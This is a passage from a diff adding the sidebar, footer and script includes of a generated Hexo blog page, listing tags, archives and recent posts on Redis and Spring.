+      <a href="/blog/tags/Hadoop/" style="font-size: 17.5px;">Hadoop</a> <a href="/blog/tags/Java/" style="font-size: 16.67px;">Java</a> <a href="/blog/tags/JavaScript/" style="font-size: 10px;">JavaScript</a> <a href="/blog/tags/Jstrom/" style="font-size: 12.5px;">Jstrom</a> <a href="/blog/tags/Linux/" style="font-size: 20px;">Linux</a> <a href="/blog/tags/kafka/" style="font-size: 12.5px;">kafka</a> <a href="/blog/tags/mysql/" style="font-size: 14.17px;">mysql</a> <a href="/blog/tags/note/" style="font-size: 18.33px;">note</a> <a href="/blog/tags/oracle/" style="font-size: 13.33px;">oracle</a> <a href="/blog/tags/python/" style="font-size: 19.17px;">python</a> <a href="/blog/tags/redis/" style="font-size: 15px;">redis</a> <a href="/blog/tags/scala/" style="font-size: 10px;">scala</a> <a href="/blog/tags/spark/" style="font-size: 15.83px;">spark</a> <a href="/blog/tags/web/" style="font-size: 10.83px;">web</a> <a href="/blog/tags/work/" style="font-size: 10px;">work</a> <a href="/blog/tags/其他/" style="font-size: 10px;">其他</a> <a href="/blog/tags/开发工具/" style="font-size: 15px;">开发工具</a> <a href="/blog/tags/数据库/" style="font-size: 12.5px;">数据库</a> <a href="/blog/tags/项目/" style="font-size: 11.67px;">项目</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2018/07/">七月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2018/06/">六月 2018</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/blog/2018/07/10/数据库/redis/redis增删改查----Spring+redis/">redis增删改查----Spring+redis</a>
+          </li>
+        
+          <li>
+            <a href="/blog/2018/07/10/数据库/redis/资料/">资料</a>
+          </li>
+        
+          <li>
+            <a href="/blog/2018/07/10/数据库/redis/redis增删改查----控制台/">redis增删改查----控制台</a>
+          </li>
+        
+          <li>
+            <a href="/blog/2018/07/10/数据库/redis/springLTredis/">springLTredis</a>
+          </li>
+        
+          <li>
+            <a href="/blog/2018/07/10/数据库/redis/redis配置/">redis配置</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2018 Han Laotwo<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/blog/" class="mobile-nav-link">Home</a>
+  
+    <a href="/blog/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/blog/fancybox/jquery.fancybox.css">
+  <script src="/blog/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/blog/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
